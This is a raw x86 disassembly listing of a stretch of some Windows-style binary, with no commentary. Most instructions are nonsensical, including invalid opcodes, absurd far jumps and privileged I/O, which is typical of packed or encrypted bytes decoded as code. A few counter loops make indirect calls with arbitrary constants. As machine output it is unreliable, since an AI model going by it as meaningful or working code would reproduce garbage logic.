  4125e1:	jbe    0x41263f
  4125e3:	test   DWORD PTR [ebp+0x75f904cc],edx
  4125e9:	xor    ebx,esp
  4125eb:	sub    al,BYTE PTR [ebp-0x5]
  4125ee:	jmp    0x41261f
  4125f0:	push   ebx
  4125f1:	xchg   esi,eax
  4125f2:	jb     0x41262f
  4125f4:	retf   
  4125f5:	jecxz  0x412606
  4125f7:	stc    
  4125f8:	dec    ebp
  4125f9:	fwait
  4125fa:	sub    DWORD PTR [ecx],esi
  4125fc:	(bad)  
  4125fd:	retf   
  4125fe:	(bad)  
  412600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412601:	in     al,dx
  412602:	(bad)  
  412603:	sti    
  412604:	mov    al,0x16
  412606:	cmp    BYTE PTR [edi+0x1e],cl
  412609:	pop    ds
  41260a:	push   ecx
  41260b:	fcom   QWORD PTR [edx]
  41260d:	cli    
  41260e:	dec    ebx
  41260f:	cmp    BYTE PTR [edx-0x5478bb18],bh
  412615:	push   cs
  412616:	lock dec edx
  412618:	jmp    0x3191:0xd2cd6f7c
  41261f:	mov    ebx,0x60c92da
  412624:	adc    ebx,DWORD PTR [esp+esi*4+0x54]
  412628:	sahf   
  412629:	lods   al,BYTE PTR ds:[esi]
  41262a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41262b:	push   ds
  41262c:	dec    ebx
  41262d:	sub    DWORD PTR [esi+edi*1],ebx
  412630:	xchg   esi,eax
  412631:	sbb    ebp,DWORD PTR [ebp-0x5e]
  412634:	ins    DWORD PTR es:[edi],dx
  412635:	jnp    0x4125fb
  412637:	loopne 0x4126b1
  412639:	fistp  WORD PTR [ebx+0x26]
  41263c:	loope  0x41260c
  41263e:	in     eax,dx
  41263f:	pop    ecx
  412640:	mov    al,ds:0x16cdb6db
  412645:	daa    
  412646:	sub    BYTE PTR [ebx+0x2d],ah
  412649:	sub    eax,0x8dc6278a
  41264e:	test   DWORD PTR [edi],esi
  412650:	jmp    0x412621
  412652:	(bad)  
  412653:	mov    bh,0x9f
  412655:	sub    BYTE PTR [esi-0x33],ch
  412658:	pop    ds
  412659:	xor    esi,edx
  41265b:	jae    0x4126c2
  41265d:	adc    ah,BYTE PTR [ebp-0x1cba2cda]
  412663:	shufps xmm5,XMMWORD PTR [edx+0x6c852250],0x59
  41266b:	fld    TBYTE PTR es:[eax-0xe]
  41266f:	sahf   
  412670:	xchg   BYTE PTR [ebx+edx*4],al
  412673:	pop    edx
  412674:	call   0xd9e4:0x3d771bc3
  41267b:	pop    edx
  41267c:	or     eax,0xf080bc80
  412681:	je     0x4126d5
  412683:	mov    bh,0x17
  412685:	mov    eax,ds:0x876d1723
  41268a:	and    BYTE PTR [esi-0x7e],bl
  41268d:	cmp    dh,BYTE PTR [ebp-0x3dd0c3ed]
  412693:	stos   DWORD PTR es:[edi],eax
  412694:	mov    gs,WORD PTR [esi-0x5b]
  412697:	xchg   DWORD PTR [ebp+0x75],esp
  41269a:	xor    esp,DWORD PTR [eax-0x16]
  41269d:	in     eax,0x3
  41269f:	dec    eax
  4126a0:	dec    eax
  4126a1:	mov    al,ds:0xf737a54a
  4126a6:	adc    DWORD PTR [edi+0x6b],eax
  4126a9:	leave  
  4126aa:	in     eax,dx
  4126ab:	push   ebp
  4126ac:	ja     0x4126aa
  4126ae:	scas   eax,DWORD PTR es:[edi]
  4126af:	or     al,0xb7
  4126b1:	or     DWORD PTR [ecx],ebp
  4126b3:	outs   dx,DWORD PTR ds:[esi]
  4126b4:	push   ebx
  4126b5:	test   DWORD PTR [edi],ebp
  4126b7:	dec    ebx
  4126b8:	lds    edx,FWORD PTR [edi+0x71]
  4126bb:	pop    esp
  4126bc:	sbb    DWORD PTR ds:0x5aa30fb2,ebx
  4126c2:	js     0x41265e
  4126c4:	add    BYTE PTR ds:0x3b5aca2e,bl
  4126ca:	dec    edi
  4126cb:	push   edx
  4126cc:	cmp    al,0xcf
  4126ce:	(bad)  
  4126d0:	push   ebx
  4126d1:	(bad)  
  4126d2:	push   eax
  4126d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126d4:	xchg   esi,eax
  4126d5:	dec    eax
  4126d6:	dec    esi
  4126d7:	ins    DWORD PTR es:[edi],dx
  4126d8:	xchg   edi,eax
  4126d9:	adc    DWORD PTR [eax+0x28],edi
  4126dc:	jp     0x41274e
  4126de:	ins    DWORD PTR es:[edi],dx
  4126df:	out    dx,eax
  4126e0:	jae    0x412755
  4126e2:	xchg   edi,eax
  4126e3:	lock jb 0x41270f
  4126e6:	dec    ebx
  4126e7:	ins    DWORD PTR es:[edi],dx
  4126e8:	aas    
  4126e9:	enter  0x1603,0x74
  4126ed:	or     al,0xfb
  4126ef:	fbld   TBYTE PTR [esi+0x288eb6ce]
  4126f5:	fdiv   DWORD PTR [ecx]
  4126f7:	cmp    BYTE PTR gs:[esi],0x67
  4126fb:	(bad)
  4126ff:	xor    eax,0xe4dc3eb7
  412704:	and    eax,0xd63abfad
  412709:	repz call 0xd9c8:0x35eca9d9
  412711:	iret   
  412712:	popa   
  412713:	xchg   edi,eax
  412714:	retf   
  412715:	test   BYTE PTR [ebx+0x6418a094],0x6a
  41271c:	dec    esp
  41271d:	addr16 dec ebx
  41271f:	stos   DWORD PTR es:[edi],eax
  412720:	loop   0x412712
  412722:	mov    ds:0x99bc8967,al
  412727:	aaa    
  412728:	ins    DWORD PTR es:[edi],dx
  412729:	imul   ecx,DWORD PTR [esi+0x7c3fb84f],0xe44d890f
  412733:	and    DWORD PTR ds:0x42fd76,0x0
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fd76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fd76,ecx
  412751:	cmp    DWORD PTR ds:0x42fd76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fd76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e313
  41277c:	cmp    DWORD PTR ds:0x42fd76,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fd76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fd76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fd6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    ebp,ebp
  4127be:	dec    edi
  4127bf:	push   DWORD PTR [ecx]
  4127c1:	enter  0x7059,0x70
  4127c5:	mov    ecx,0x2f70707e
  4127ca:	push   eax
  4127cb:	and    ecx,esp
  4127cd:	sub    eax,0xf0a2c8f1
  4127d2:	lds    edi,FWORD PTR [ebp+0x12eab165]
  4127d8:	sbb    esi,DWORD PTR [esi-0x6f84f17f]
  4127de:	out    0x60,eax
  4127e0:	jne    0x41284d
  4127e2:	jns    0x412794
  4127e4:	rcl    edi,cl
  4127e6:	sahf   
  4127e7:	lods   eax,DWORD PTR ds:[esi]
  4127e8:	cdq    
  4127e9:	fsubr  QWORD PTR [ebx]
  4127eb:	arpl   WORD PTR [edi+ebx*2+0x16933f65],dx
  4127f2:	and    DWORD PTR [edx],0x6b
  4127f5:	dec    edi
  4127f6:	jge    0x4127f1
  4127f8:	inc    ebp
  4127f9:	(bad)  
  4127fa:	push   ss
  4127fb:	(bad)  
  4127fc:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4127fe:	cmp    eax,0xc792d658
  412803:	ins    DWORD PTR es:[edi],dx
  412804:	test   BYTE PTR [ebx+0x7f],bh
  412807:	mov    eax,ds:0x28e755d
  41280c:	out    0xf7,eax
  41280e:	sbb    eax,0x119c9404
  412813:	mov    al,0x8e
  412815:	shl    esi,0x8d
  412818:	ret    0xce09
  41281b:	adc    bl,BYTE PTR [ebx-0x7a]
  41281e:	imul   esp,DWORD PTR [esi],0x83e3ed61
  412824:	mov    ds:0x85755919,al
  412829:	jne    0x412820
  41282b:	rcl    bh,0xe
  41282e:	jecxz  0x4127c0
  412830:	cmp    eax,0x9da19fbc
  412835:	and    esi,DWORD PTR ss:[edx-0x2d5c778e]
  41283c:	mov    al,0xb5
  41283e:	in     al,dx
  41283f:	adc    bh,bl
  412841:	cdq    
  412842:	xchg   esp,eax
  412843:	adc    al,0x8
  412845:	ficom  DWORD PTR [esi+0x3df0e5f4]
  41284b:	fbld   TBYTE PTR [edi+0x1e7b98c6]
  412851:	mov    ecx,DWORD PTR [ebx-0x48201c8]
  412857:	sub    al,BYTE PTR [ebx+0x2e]
  41285a:	sub    al,BYTE PTR [edi]
  41285c:	mov    ebp,0x99db5857
  412861:	into   
  412862:	mov    DWORD PTR ds:0x7d101383,0x957eb320
  41286c:	popa   
  41286d:	out    0x5c,al
  41286f:	inc    ebx
  412870:	shr    DWORD PTR [edx],0x14
  412873:	cmp    BYTE PTR [edx],dh
  412875:	in     al,dx
  412876:	gs jno 0x4127fb
  412879:	sbb    ebp,ebx
  41287b:	jg     0x4128d4
  41287d:	dec    ecx
  41287e:	sahf   
  41287f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412880:	mov    eax,0x4d9ebf60
  412885:	xchg   esi,eax
  412886:	mov    ebx,DWORD PTR [ebx-0x14]
  412889:	in     eax,0xa5
  41288b:	enter  0x6a9d,0xa2
  41288f:	or     esi,DWORD PTR [esi-0x49]
  412892:	pop    edx
  412893:	mov    ah,0x74
  412895:	stc    
  412896:	enter  0x3f38,0x10
  41289a:	std    
  41289b:	sbb    eax,0x8fb3ce0e
  4128a0:	or     esi,ecx
  4128a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128a3:	jp     0x412873
  4128a5:	cli    
  4128a6:	in     eax,0xc0
  4128a8:	pop    edi
  4128a9:	adc    DWORD PTR [ebx+0x514c9b51],0xffffffd0
  4128b0:	jnp    0x4128f8
  4128b2:	je     0x412857
  4128b4:	or     eax,0xa7283e90
  4128b9:	ss cmp dl,cl
  4128bc:	or     ebp,ebx
  4128be:	pushf  
  4128bf:	dec    ebx
  4128c0:	hlt    
  4128c1:	loop   0x4128a2
  4128c3:	xchg   ecx,eax
  4128c4:	cmp    al,0xe5
  4128c6:	hlt    
  4128c7:	xor    eax,0x13245eb2
  4128cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128cd:	cli    
  4128ce:	sbb    ch,ah
  4128d0:	adc    ch,0xb2
  4128d3:	into   
  4128d4:	icebp  
  4128d5:	add    al,0x84
  4128d7:	jp     0x4128e5
  4128d9:	xlat   BYTE PTR ds:[ebx]
  4128da:	(bad)  
  4128db:	dec    esp
  4128dc:	push   edx
  4128dd:	mov    dl,0xa9
  4128df:	clc    
  4128e0:	jecxz  0x41295d
  4128e2:	test   al,0xdb
  4128e4:	cmp    BYTE PTR [edi],al
  4128e6:	mov    ch,0xd0
  4128e8:	test   ch,dh
  4128ea:	ds popf 
  4128ec:	mov    DWORD PTR [edx-0x11f5d487],esi
  4128f2:	sub    DWORD PTR [eax+0x30ff2272],ecx
  4128f8:	mov    edx,0x1ee0d3d4
  4128fd:	inc    ebx
  4128fe:	loopne 0x41293d
  412900:	popa   
  412901:	adc    esi,0x504a7576
  412907:	inc    ebp
  412908:	push   esp
  412909:	pop    ds
  41290a:	(bad)  
  41290c:	stos   DWORD PTR es:[edi],eax
  41290d:	out    dx,eax
  41290e:	test   DWORD PTR [ebp+0x20],eax
  412911:	lea    esi,[edi-0x1cbf2d01]
  412917:	mov    ebp,0xe47b0afc
  41291c:	jbe    0x412929
  41291e:	dec    ebx
  41291f:	mov    ebx,0x22e0cfa5
  412924:	pop    eax
  412925:	push   0xb25ff909
  41292a:	shl    DWORD PTR [edi+edx*8],cl
  41292d:	dec    eax
  41292e:	mov    al,ds:0xbe404e98
  412933:	ret    
  412934:	mov    edx,0x21ccee31
  412939:	adc    ecx,edx
  41293b:	xchg   edi,eax
  41293c:	cmp    al,0x73
  41293e:	sbb    BYTE PTR [ebx+0x3b57c2f4],ch
  412944:	fstp   QWORD PTR [ebx-0x6f96f750]
  41294a:	int    0x4c
  41294c:	(bad)  
  41294d:	jecxz  0x41299e
  41294f:	stos   BYTE PTR es:[edi],al
  412950:	mov    WORD PTR [esi+0x31],?
  412953:	sti    
  412954:	out    dx,eax
  412955:	lds    ebx,FWORD PTR [ebx]
  412957:	xchg   ecx,eax
  412958:	cs lahf 
  41295a:	jmp    0x8863:0xd05027f5
  412961:	adc    eax,0x215964b6
  412966:	pusha  
  412967:	ror    DWORD PTR [ecx],0xc6
  41296a:	sbb    al,dl
  41296c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41296d:	fstp   TBYTE PTR [edx]
  41296f:	jmp    0x2f889ada
  412974:	addr16 adc eax,0xaabda0a0
  41297a:	dec    eax
  41297b:	ds repnz stos BYTE PTR es:[edi],al
  41297e:	or     eax,0x655b1a78
  412983:	dec    esp
  412984:	adc    ch,bh
  412986:	fchs   
  412988:	jbe    0x41293d
  41298a:	mov    BYTE PTR [ebx+edx*2-0x57c21e8b],ah
  412991:	test   al,0x60
  412993:	add    dh,BYTE PTR [edi-0x6f]
  412996:	jno    0x41296d
  412998:	imul   DWORD PTR ds:0x15d1bb43
  41299e:	ss inc ebx
  4129a0:	stos   BYTE PTR es:[edi],al
  4129a1:	lods   al,BYTE PTR ds:[esi]
  4129a2:	aas    
  4129a3:	sbb    eax,0x992273c0
  4129a8:	outs   dx,BYTE PTR ds:[esi]
  4129a9:	add    cl,BYTE PTR [edi+0x65fa2051]
  4129af:	outs   dx,BYTE PTR ds:[esi]
  4129b0:	ror    esi,cl
  4129b2:	sub    bh,BYTE PTR [edi]
  4129b4:	ret    0xcacf
  4129b7:	dec    ebp
  4129b8:	push   es
  4129b9:	add    bh,dl
  4129bb:	hlt    
  4129bc:	loope  0x41299f
  4129be:	pop    eax
  4129bf:	inc    edi
  4129c0:	pushf  
  4129c1:	mov    ebx,0x87e3011e
  4129c6:	pusha  
  4129c7:	mov    cl,0x81
  4129c9:	add    al,0x1f
  4129cb:	or     DWORD PTR cs:[edi-0x39324f01],0x70053ba9
  4129d6:	jae    0x41297c
  4129d8:	data16 jo 0x412a3b
  4129db:	dec    ecx
  4129dc:	sbb    eax,0xf42aa739
  4129e1:	inc    ebx
  4129e2:	push   esp
  4129e3:	out    dx,eax
  4129e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129e5:	push   eax
  4129e6:	cld    
  4129e7:	std    
  4129e8:	push   cs
  4129e9:	adc    BYTE PTR [ebp-0x2a6b5edb],0x13
  4129f0:	jnp    0x412a44
  4129f2:	pop    esp
  4129f3:	push   es
  4129f4:	imul   ebp,DWORD PTR [edx],0x51
  4129f7:	cs or  al,0xb3
  4129fa:	cmp    eax,0x7b99b3e9
  4129ff:	shl    BYTE PTR [eax-0x2115f277],1
  412a05:	fnstsw WORD PTR [esi-0x64]
  412a08:	into   
  412a09:	xchg   ebp,eax
  412a0a:	std    
  412a0b:	cdq    
  412a0c:	in     al,dx
  412a0d:	inc    eax
  412a0e:	xchg   esp,eax
  412a0f:	or     DWORD PTR [esi+0x16459680],0x2db57f89
  412a19:	(bad)  
  412a1a:	jmp    0x4129e8
  412a1c:	out    0x6a,eax
  412a1e:	sahf   
  412a1f:	fistp  QWORD PTR [esi+0x126b237d]
  412a25:	int    0x3c
  412a27:	jno    0x412a25
  412a29:	push   edi
  412a2a:	imul   DWORD PTR [edx+0x3585b3b8]
  412a30:	pop    ss
  412a31:	call   0xc9de7759
  412a36:	fwait
  412a37:	cmp    cl,bh
  412a39:	mov    dh,0xf4
  412a3b:	in     al,dx
  412a3c:	dec    esp
  412a3d:	mov    al,ds:0xe92a85af
  412a42:	shr    BYTE PTR [ebx],cl
  412a44:	lahf   
  412a45:	xchg   ebx,eax
  412a46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a47:	xchg   esp,eax
  412a48:	pop    edi
  412a49:	int3   
  412a4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a4b:	xchg   edx,eax
  412a4c:	scas   al,BYTE PTR es:[edi]
  412a4d:	mov    ebp,0x99ef6dd0
  412a52:	test   DWORD PTR [esi-0x15],0x4a71f4c5
  412a59:	pop    ss
  412a5a:	rcr    DWORD PTR ds:0xafaba323,1
  412a60:	or     al,BYTE PTR [edi]
  412a62:	pop    esp
  412a63:	xchg   edi,eax
  412a64:	test   eax,0x9b241bf6
  412a69:	aas    
  412a6a:	mov    eax,0x3b593a0
  412a6f:	pushf  
  412a70:	in     eax,0x6d
  412a72:	(bad)  
  412a73:	mul    BYTE PTR [eax+0x26f34c5b]
  412a79:	xchg   edi,eax
  412a7a:	mov    bl,0x2f
  412a7c:	(bad)  
  412a7d:	aad    0x58
  412a7f:	loope  0x412aa8
  412a81:	add    DWORD PTR [eax-0x209f9d95],ebx
  412a87:	mov    eax,ds:0x82a0e7dd
  412a8c:	jmp    DWORD PTR [edx-0x1b]
  412a8f:	les    ecx,FWORD PTR [edi]
  412a91:	test   BYTE PTR [eax],dl
  412a93:	add    BYTE PTR [eax],al
  412a95:	add    BYTE PTR [ebx+0x3d03144d],cl
  412a9b:	and    cl,ah
  412a9d:	inc    edx
  412a9e:	add    BYTE PTR [ebx-0x7609f4f7],cl
  412aa4:	dec    ebp
  412aa5:	in     al,0xc7
  412aa7:	add    eax,0x42fcf5
  412aac:	pop    ss
  412aad:	add    BYTE PTR [eax],al
  412aaf:	add    BYTE PTR [ebx+0x42fcf53d],al
  412ab5:	add    BYTE PTR [eax],al
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fcf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e317
  412af1:	mov    edi,DWORD PTR ds:0x42fcf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fcf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e128
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e118,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412b1a
  412b3b:	mov    edx,DWORD PTR [edx]
  412b3d:	or     eax,0x70706611
  412b42:	mov    ecx,0x1170707e
  412b47:	cmp    eax,0x1001c0e2
  412b4c:	outs   dx,DWORD PTR ds:[esi]
  412b4d:	mov    cl,0xf6
  412b4f:	aas    
  412b50:	push   ecx
  412b51:	push   es
  412b52:	cld    
  412b53:	loope  0x412b08
  412b55:	inc    ebx
  412b56:	xor    al,0x55
  412b58:	xor    ecx,DWORD PTR [edx+0x68cb3122]
  412b5e:	inc    eax
  412b5f:	(bad)  
  412b60:	dec    esi
  412b61:	dec    esi
  412b62:	stc    
  412b63:	dec    esi
  412b64:	hlt    
  412b65:	retf   
  412b66:	int    0x2
  412b68:	int3   
  412b69:	lods   eax,DWORD PTR ds:[esi]
  412b6a:	jns    0x412b66
  412b6c:	icebp  
  412b6d:	xchg   esp,eax
  412b6e:	fwait
  412b6f:	std    
  412b70:	ss jnp 0x412b04
  412b73:	mov    esp,0xe33a60f0
  412b78:	cmp    al,0x46
  412b7a:	aas    
  412b7b:	fucomi st,st(2)
  412b7d:	push   0xffffffc0
  412b7f:	cmove  esp,DWORD PTR [esi-0xd15a465]
  412b86:	inc    ecx
  412b87:	lods   eax,DWORD PTR ds:[esi]
  412b88:	sub    al,BYTE PTR [ebx+0x5d12771]
  412b8e:	sbb    BYTE PTR [ebx],bh
  412b90:	sub    al,0xb7
  412b92:	inc    ebp
  412b93:	adc    dh,BYTE PTR ds:[edx+0x26]
  412b97:	cmp    eax,0x1b69d88d
  412b9c:	pusha  
  412b9d:	dec    ecx
  412b9e:	lock mov edx,0x9af82f6e
  412ba4:	test   cl,bh
  412ba6:	clc    
  412ba7:	shl    DWORD PTR [ebx+0x1dd4877f],1
  412bad:	into   
  412bae:	pop    ebx
  412baf:	in     al,dx
  412bb0:	and    ebp,ecx
  412bb2:	pop    esp
  412bb3:	xor    eax,0x25f95910
  412bb8:	js     0x412b87
  412bba:	sti    
  412bbb:	call   0xaf88:0xa189173f
  412bc2:	cmc    
  412bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bc4:	xchg   esi,eax
  412bc5:	pop    eax
  412bc6:	ja     0x412bef
  412bc8:	xor    al,0xfd
  412bca:	les    esp,FWORD PTR [eax+0x59c223ab]
  412bd0:	(bad)  
  412bd1:	or     bl,BYTE PTR [ecx]
  412bd3:	retf   0x2c37
  412bd6:	ss sahf 
  412bd8:	cdq    
  412bd9:	(bad)  ds:0xdd895469
  412bdf:	in     eax,dx
  412be0:	mov    esp,DWORD PTR ds:0x8cb48a79
  412be6:	in     eax,dx
  412be7:	jle    0x412bb0
  412be9:	shl    BYTE PTR [edx+eiz*2],cl
  412bec:	mov    ch,0xef
  412bee:	sub    BYTE PTR [ecx+0x282d31a5],bl
  412bf4:	icebp  
  412bf5:	or     DWORD PTR [eax],edx
  412bf7:	mov    esp,0x9bbe3999
  412bfc:	outs   dx,BYTE PTR ds:[esi]
  412bfd:	imul   BYTE PTR [ebp-0x79496cd7]
  412c03:	xor    edx,DWORD PTR [ecx+0x5c]
  412c06:	mov    al,BYTE PTR [esp+esi*8+0x2cc68352]
  412c0d:	cmp    al,0xba
  412c0f:	jmp    0x412b9d
  412c11:	push   ss
  412c12:	rol    DWORD PTR ds:0x1dc40641,cl
  412c18:	add    DWORD PTR [ecx+0x1ad5ebd],edi
  412c1e:	dec    ebp
  412c1f:	and    BYTE PTR [edx-0x5c5433be],cl
  412c25:	rcl    BYTE PTR [edx],1
  412c27:	lahf   
  412c28:	jl     0x412c35
  412c2a:	mov    eax,ds:0xe31ad86a
  412c2f:	rol    DWORD PTR [edx+0x137dd04d],1
  412c35:	ja     0x412c41
  412c37:	cmc    
  412c38:	fwait
  412c39:	ror    BYTE PTR [edi+0x52],cl
  412c3c:	and    eax,0x68d63a2a
  412c41:	sub    eax,0x87367775
  412c46:	xchg   esp,eax
  412c47:	daa    
  412c48:	(bad)  
  412c49:	dec    ebx
  412c4a:	or     esp,ebp
  412c4c:	fucom  st(3)
  412c4e:	mov    BYTE PTR [esi+0x51941fcc],cl
  412c54:	jne    0x412c84
  412c56:	xlat   BYTE PTR ds:[ebx]
  412c57:	pushf  
  412c58:	cwde   
  412c59:	dec    esi
  412c5a:	test   DWORD PTR [ebx+edx*8],esi
  412c5d:	sbb    eax,0x3a81607b
  412c62:	cmc    
  412c63:	shl    BYTE PTR [esi],0x62
  412c66:	data16 loopne 0x412c00
  412c69:	xor    DWORD PTR [edx+ebx*8+0x7d7e4e99],ebx
  412c70:	loop   0x412c35
  412c72:	sbb    eax,eax
  412c74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c75:	sbb    BYTE PTR [esi],al
  412c77:	fnstsw WORD PTR [ecx-0x43]
  412c7a:	scas   al,BYTE PTR es:[edi]
  412c7b:	(bad)  [ecx+0x1a977d31]
  412c81:	aaa    
  412c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c83:	mov    ah,0x48
  412c85:	xchg   edx,eax
  412c86:	imul   eax,DWORD PTR [eax+0x5022ef74],0xd52bbbc4
  412c90:	and    edi,DWORD PTR [ebx+edx*1-0x67]
  412c94:	inc    eax
  412c95:	shl    BYTE PTR [ecx],cl
  412c97:	pop    eax
  412c98:	or     edi,esp
  412c9a:	enter  0x1f1b,0xe8
  412c9e:	sti    
  412c9f:	cmp    bh,BYTE PTR [ebx+0x5c0b3084]
  412ca5:	xchg   ebx,eax
  412ca6:	and    eax,0x402b826a
  412cab:	outs   dx,DWORD PTR ds:[esi]
  412cac:	add    DWORD PTR [esi+0x7c],edx
  412caf:	xor    DWORD PTR [edi-0x5a461013],edx
  412cb5:	in     eax,0x78
  412cb7:	lods   eax,DWORD PTR ds:[esi]
  412cb8:	mov    DWORD PTR [ecx+edi*4-0x7f],0x3dd06391
  412cc0:	and    al,0xf5
  412cc2:	gs repz (bad) 
  412cc5:	xchg   cx,ax
  412cc7:	adc    BYTE PTR [ebp-0x6159d5da],al
  412ccd:	not    edx
  412ccf:	daa    
  412cd0:	inc    edx
  412cd1:	dec    edx
  412cd2:	pushf  
  412cd3:	adc    al,0xe0
  412cd5:	outs   dx,DWORD PTR ds:[esi]
  412cd6:	fld    TBYTE PTR [ebp-0x2bbf5d40]
  412cdc:	jl     0x412c97
  412cde:	stos   DWORD PTR es:[edi],eax
  412cdf:	(bad)  
  412ce0:	lods   al,BYTE PTR ds:[esi]
  412ce1:	sub    bh,BYTE PTR [esi-0x2efc1523]
  412ce7:	(bad)  
  412ce8:	call   0x1796b3b0
  412ced:	lahf   
  412cee:	nop
  412cef:	and    esi,DWORD PTR [edi-0x739d8c39]
  412cf5:	and    al,0xa3
  412cf7:	cmp    bh,BYTE PTR [edx+0x26]
  412cfa:	cwde   
  412cfb:	xor    bl,BYTE PTR [eax]
  412cfd:	mov    WORD PTR [esi],ds
  412cff:	or     al,0x7a
  412d01:	xchg   BYTE PTR [esi],ch
  412d03:	xchg   DWORD PTR [edi+0x44],ecx
  412d06:	iret   
  412d07:	xor    eax,0xeb867474
  412d0c:	addr16 cmp al,0x7e
  412d0f:	arpl   ax,bx
  412d11:	mov    WORD PTR ds:0x1d99bced,es
  412d17:	xchg   esp,eax
  412d18:	sbb    eax,0xd2d4a25b
  412d1d:	out    dx,al
  412d1e:	dec    edx
  412d1f:	daa    
  412d20:	jno    0x412d1f
  412d22:	jecxz  0x412d22
  412d24:	fdivr  DWORD PTR [edx+edx*1]
  412d27:	sbb    esp,DWORD PTR [ebx-0x19]
  412d2a:	stos   DWORD PTR es:[edi],eax
  412d2b:	jl     0x412cfc
  412d2d:	sahf   
  412d2e:	mov    bl,0xc4
  412d30:	and    DWORD PTR [esi],esp
  412d32:	pop    esp
  412d33:	test   dh,bh
  412d35:	neg    DWORD PTR [esi]
  412d37:	jmp    0x412d10
  412d39:	jb     0x412cdf
  412d3b:	jbe    0x412d78
  412d3d:	cmp    al,BYTE PTR [ebx+edi*4+0x39cee50c]
  412d44:	fninit 
  412d46:	push   ebp
  412d47:	push   ds
  412d48:	inc    ebp
  412d49:	push   ebp
  412d4a:	and    edi,DWORD PTR [ebp+0x74e514f9]
  412d50:	rol    DWORD PTR [esp+eiz*4-0x29eb3266],cl
  412d57:	call   0x2beec346
  412d5c:	in     al,0x80
  412d5e:	xor    al,0xeb
  412d60:	cmp    ebp,0xffffffa2
  412d63:	push   ebp
  412d64:	push   ds
  412d65:	stos   BYTE PTR es:[edi],al
  412d66:	sar    DWORD PTR [edx-0x25],1
  412d69:	jb     0x412d2b
  412d6b:	(bad)  
  412d6c:	repnz mov bh,BYTE PTR [eax]
  412d6f:	ja     0x412d0c
  412d71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d72:	push   ebx
  412d73:	outs   dx,DWORD PTR ds:[esi]
  412d74:	cmp    BYTE PTR es:[ebx+0x758d5507],dl
  412d7b:	fsubr  QWORD PTR [edx+ebx*2+0x1e482fcd]
  412d82:	and    BYTE PTR [ecx-0xf],cl
  412d85:	mov    BYTE PTR [ebp+0x3b],al
  412d88:	push   0x87c311d5
  412d8d:	xlat   BYTE PTR ds:[ebx]
  412d8e:	enter  0x9a9f,0x0
  412d92:	jg     0x412dfd
  412d94:	mov    BYTE PTR [ebx+0x7ec53a88],cl
  412d9a:	cmc    
  412d9b:	push   es
  412d9c:	jne    0x412db6
  412d9e:	movntq QWORD PTR [ecx+edi*4+0x41],mm5
  412da3:	popf   
  412da4:	jp     0x412e1e
  412da6:	(bad)  
  412da7:	xor    eax,0xb6bc997
  412dac:	mov    ebx,0xd34e58a9
  412db1:	cdq    
  412db2:	test   DWORD PTR [ebx],0x2ff80e1e
  412db8:	mov    esp,ebx
  412dba:	aam    0x19
  412dbc:	enter  0xfde3,0xc8
  412dc0:	retf   0x89e2
  412dc3:	or     ebx,ebx
  412dc5:	mov    ecx,0xc290d24d
  412dca:	sbb    ah,ah
  412dcc:	pop    ss
  412dcd:	or     ebx,ecx
  412dcf:	dec    ebx
  412dd0:	rcr    BYTE PTR [ebp-0x44189ac5],1
  412dd6:	mov    ds:0xf9526121,al
  412ddb:	jecxz  0x412dd2
  412ddd:	jle    0x412d8b
  412ddf:	les    esi,FWORD PTR [eax]
  412de1:	xchg   ebp,eax
  412de2:	test   eax,0x6a042bd3
  412de7:	stos   DWORD PTR es:[edi],eax
  412de8:	adc    dl,bh
  412dea:	sbb    eax,0x997ff78f
  412def:	cwd    
  412df1:	mov    bl,0x44
  412df3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
